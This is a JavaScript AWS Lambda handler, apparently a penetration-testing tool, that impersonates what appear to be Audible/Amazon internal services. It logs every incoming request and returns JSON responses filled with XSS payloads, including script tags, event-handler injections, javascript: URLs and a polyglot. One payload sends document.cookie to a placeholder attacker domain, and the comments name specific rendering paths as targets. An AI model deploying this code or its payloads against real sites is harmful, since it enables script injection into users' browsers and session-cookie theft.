exports.handler = async (event) => {
  // Log the incoming request for debugging
  const headers = event.headers || {};
  const target = headers['x-amz-target'] || headers['x-amzn-target'] || '';
  const contentType = headers['content-type'] || '';
  const path = event.path || '';
  const body = event.body || '';

  console.log('=== Incoming Request ===');
  console.log('Path:', path);
  console.log('Method:', event.httpMethod);
  console.log('Target:', target);
  console.log('Content-Type:', contentType);
  console.log('Headers:', JSON.stringify(headers, null, 2));
  console.log('Body:', body.substring(0, 500));

  // XSS Payloads - vary these to test different rendering contexts
  const XSS = {
    img: '<img src=x onerror="alert(document.domain)">',
    svg: '<svg/onload=alert(document.domain)>',
    script: '<script>alert(document.domain)</script>',
    iframe: '<iframe src="javascript:alert(document.domain)"></iframe>',
    event: '" onmouseover="alert(document.domain)" data-x="',
    steal: '<img src=x onerror="new Image().src=\'https://YOUR-ATTACKER-DOMAIN.com/steal?c=\'+document.cookie">',
    polyglot: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>'
  };

  let response;

  // Route based on x-amz-target header (Coral operation routing)
  if (target.includes('GetRankedCreativesContent') || target.includes('DynamicRanking')) {
    response = buildDynamicRankingResponse(XSS);
  } else if (target.includes('GetDynamicPages')) {
    response = buildDynamicPagesResponse(XSS);
  } else if (target.includes('GetDynamicSlots')) {
    response = buildDynamicSlotsResponse(XSS);
  } else if (target.includes('GetDynamicContent')) {
    response = buildDynamicContentResponse(XSS);
  } else if (target.includes('GetProducts') || target.includes('CatalogData')) {
    response = buildCatalogDataResponse(XSS);
  } else if (target.includes('GetReviews') || target.includes('Reviews')) {
    response = buildReviewsResponse(XSS);
  } else if (target.includes('HelpContent') || target.includes('GetArticle')) {
    response = buildHelpContentResponse(XSS);
  } else if (target.includes('GetLibrary') || target.includes('LibraryData')) {
    response = buildLibraryDataResponse(XSS);
  } else if (target.includes('Recommendation') || target.includes('Stratus')) {
    response = buildRecommendationResponse(XSS);
  } else if (target.includes('GetNotification') || target.includes('Winkler')) {
    response = buildNotificationResponse(XSS);
  } else if (target.includes('BuyingOptions') || target.includes('BuyBox')) {
    response = buildBuyingOptionsResponse(XSS);
  } else {
    // Default: try to respond to everything with a generic payload
    // Parse the body to understand what's being requested
    response = buildGenericResponse(XSS, target, body);
  }

  return {
    statusCode: 200,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "x-amzn-RequestId": "fake-xss-test-" + Date.now()
    },
    body: JSON.stringify(response)
  };
};

// ============================================================
// AudibleDynamicRankingService - GetRankedCreativesContent
// This is the #1 target. placementContentMap values are rendered
// via innerHTML in Lego widgets with explicit script re-execution.
// ============================================================
function buildDynamicRankingResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibledynamicrankingservice#GetRankedCreativesContentResponse",
      "pageLoadId": "xss-test-" + Date.now(),
      "rankedCreativesContent": [
        {
          "slotId": "hero-banner-slot",
          "creativeId": "xss-creative-hero",
          "placementContentMap": {
            "title": XSS.img,
            "subtitle": XSS.svg,
            "body": XSS.script,
            "html": "<div>" + XSS.script + "</div>",
            "content": XSS.img,
            "imageUrl": "https://m.media-amazon.com/images/I/placeholder.jpg",
            "ctaText": XSS.event,
            "ctaUrl": "javascript:alert(document.domain)",
            "backgroundColor": "#000000",
            "textColor": "#ffffff"
          }
        },
        {
          "slotId": "carousel-slot-1",
          "creativeId": "xss-creative-carousel",
          "placementContentMap": {
            "title": XSS.svg,
            "body": XSS.img,
            "html": XSS.script,
            "content": "<div class='bc-container'>" + XSS.img + "</div>",
            "asin": "B0TESTXSS1",
            "productTitle": XSS.img,
            "authorName": XSS.svg
          }
        },
        {
          "slotId": "midpage-promo-slot",
          "creativeId": "xss-creative-promo",
          "placementContentMap": {
            "title": "Special Offer " + XSS.img,
            "description": XSS.script,
            "html": "<section class='promo'><h2>" + XSS.svg + "</h2><p>" + XSS.script + "</p></section>",
            "content": XSS.polyglot
          }
        }
      ],
      "metadataMap": {
        "renderMode": "html",
        "version": "2.0"
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleDynamicRankingService - GetDynamicPages
// ============================================================
function buildDynamicPagesResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibledynamicrankingservice#GetDynamicPagesResponse",
      "dynamicPageKeys": [
        {
          "pageType": "homepage",
          "pageId": XSS.img
        },
        {
          "pageType": XSS.svg,
          "pageId": "category-page"
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleDynamicRankingService - GetDynamicSlots
// ============================================================
function buildDynamicSlotsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibledynamicrankingservice#GetDynamicSlotsResponse",
      "dynamicSlots": [
        {
          "slotId": "slot-1",
          "zoneId": "zone-hero",
          "resolvedRankingContext": "context-token-123"
        },
        {
          "slotId": "slot-2",
          "zoneId": "zone-carousel",
          "resolvedRankingContext": "context-token-456"
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleDynamicRankingService - GetDynamicContent (newer API)
// ============================================================
function buildDynamicContentResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibledynamicrankingservice#GetDynamicContentResponse",
      "pageLoadId": "xss-dynamic-" + Date.now(),
      "dynamicContent": [
        {
          "slotId": "dynamic-slot-1",
          "creativeId": "dynamic-creative-1",
          "placementContentMap": {
            "html": "<div class='dynamic-widget'>" + XSS.script + "</div>",
            "title": XSS.img,
            "body": XSS.svg,
            "content": XSS.polyglot
          }
        }
      ],
      "metadataMap": {}
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleApiCatalogDataService - GetProducts
// Product titles/descriptions rendered on PDP pages
// ============================================================
function buildCatalogDataResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibleapicatalogdata#GetProductsResponse",
      "products": [
        {
          "asin": "B0GXGLXFWR",
          "title": XSS.img,
          "subtitle": XSS.svg,
          "authors": [
            {"name": XSS.img, "asin": "AUTHXSS01"}
          ],
          "narrators": [
            {"name": XSS.svg}
          ],
          "description": "<p>" + XSS.script + "</p>",
          "publisher": XSS.img,
          "release_date": "2025-01-01",
          "language": "en-US",
          "runtime_length_min": 300,
          "format_type": "unabridged",
          "product_images": {
            "500": "https://m.media-amazon.com/images/I/placeholder.jpg"
          },
          "series": [
            {"title": XSS.img, "asin": "SERIESXSS", "sequence": "1"}
          ],
          "categories": [
            {"name": XSS.svg, "id": "cat-xss"}
          ]
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleReviewsService - GetReviews
// Review text displayed on product pages
// ============================================================
function buildReviewsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblereviewsservice#GetReviewsResponse",
      "reviews": [
        {
          "reviewId": "xss-review-1",
          "title": XSS.img,
          "body": "<p>This audiobook was amazing! " + XSS.script + "</p>",
          "rating": 5,
          "authorName": XSS.svg,
          "authorId": "customer-xss",
          "createdDate": "2025-06-01T00:00:00Z",
          "helpfulCount": 42,
          "overallRating": 5,
          "performanceRating": 5,
          "storyRating": 5
        },
        {
          "reviewId": "xss-review-2",
          "title": "Great book " + XSS.svg,
          "body": XSS.img + " Really enjoyed the narration.",
          "rating": 4,
          "authorName": "Test User " + XSS.event,
          "authorId": "customer-xss-2",
          "createdDate": "2025-05-15T00:00:00Z",
          "helpfulCount": 10
        }
      ],
      "totalCount": 2,
      "averageRating": 4.5
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleHelpContentVendingService
// Help content is likely rendered as raw HTML
// ============================================================
function buildHelpContentResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblehelpcontentvendingservice#GetArticleResponse",
      "article": {
        "articleId": "help-xss-001",
        "title": XSS.img,
        "content": "<div class='help-article'><h1>How to use Audible</h1><p>" + XSS.script + "</p><p>Follow these steps:</p><ol><li>" + XSS.img + "</li><li>Open the app</li></ol></div>",
        "summary": XSS.svg,
        "category": "Getting Started",
        "lastUpdated": "2025-06-01T00:00:00Z"
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleApiLibraryDataService
// Library items rendered in user's library view
// ============================================================
function buildLibraryDataResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibleapilibrarydata#GetLibraryResponse",
      "items": [
        {
          "asin": "B0LIBXSS01",
          "title": XSS.img,
          "authors": [{"name": XSS.svg}],
          "narrators": [{"name": "Test Narrator"}],
          "purchaseDate": "2025-01-15T00:00:00Z",
          "percentComplete": 45,
          "runtime_length_min": 480,
          "cover_image_url": "https://m.media-amazon.com/images/I/placeholder.jpg",
          "series_name": XSS.img,
          "series_sequence": "1"
        },
        {
          "asin": "B0LIBXSS02",
          "title": "The " + XSS.svg + " Chronicles",
          "authors": [{"name": XSS.img}],
          "narrators": [{"name": XSS.event}],
          "purchaseDate": "2025-02-20T00:00:00Z",
          "percentComplete": 100,
          "runtime_length_min": 360
        }
      ],
      "totalCount": 2,
      "hasMore": false
    },
    "Version": "1.0"
  };
}

// ============================================================
// RecommenderStrategyService / Stratus
// Recommendation content for carousels
// ============================================================
function buildRecommendationResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.recommenderstrategyservice#GetRecommendationsResponse",
      "recommendations": [
        {
          "asin": "B0RECXSS01",
          "title": XSS.img,
          "authors": [{"name": XSS.svg}],
          "reasoning": "Because you listened to " + XSS.img,
          "category": XSS.svg,
          "rating": 4.5,
          "imageUrl": "https://m.media-amazon.com/images/I/placeholder.jpg"
        },
        {
          "asin": "B0RECXSS02",
          "title": XSS.svg,
          "authors": [{"name": "Author " + XSS.event}],
          "reasoning": XSS.script,
          "category": "Thriller",
          "rating": 4.8
        }
      ],
      "strategyId": "xss-strategy",
      "displayTitle": XSS.img
    },
    "Version": "1.0"
  };
}

// ============================================================
// WinklerService - Notifications
// ============================================================
function buildNotificationResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.winkler#GetNotificationsResponse",
      "notifications": [
        {
          "id": "notif-xss-1",
          "title": XSS.img,
          "message": "Your credit is ready! " + XSS.script,
          "type": "promotional",
          "ctaText": XSS.svg,
          "ctaUrl": "javascript:alert(document.domain)",
          "dismissible": true
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleBuyingOptionsService
// Buy box content on product pages
// ============================================================
function buildBuyingOptionsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblebuyingoptionsservice#GetBuyingOptionsResponse",
      "buyingOptions": [
        {
          "optionId": "buy-xss-1",
          "label": XSS.img,
          "description": "1 credit/month " + XSS.svg,
          "price": "$14.95",
          "savingsText": XSS.img,
          "promotionalText": XSS.script,
          "ctaText": "Add to Cart " + XSS.event
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// Generic fallback - tries to return something useful
// for any unrecognized service
// ============================================================
function buildGenericResponse(XSS, target, body) {
  return {
    "Output": {
      "__type": "com.amazon.generic#GenericResponse",
      "result": {
        "title": XSS.img,
        "content": XSS.script,
        "description": XSS.svg,
        "html": "<div>" + XSS.script + "</div>",
        "name": XSS.img,
        "text": XSS.polyglot,
        "items": [
          {
            "title": XSS.img,
            "body": XSS.script,
            "content": XSS.svg
          }
        ]
      },
      "metadata": {
        "requestTarget": target,
        "timestamp": new Date().toISOString()
      }
    },
    "Version": "1.0"
  };
}
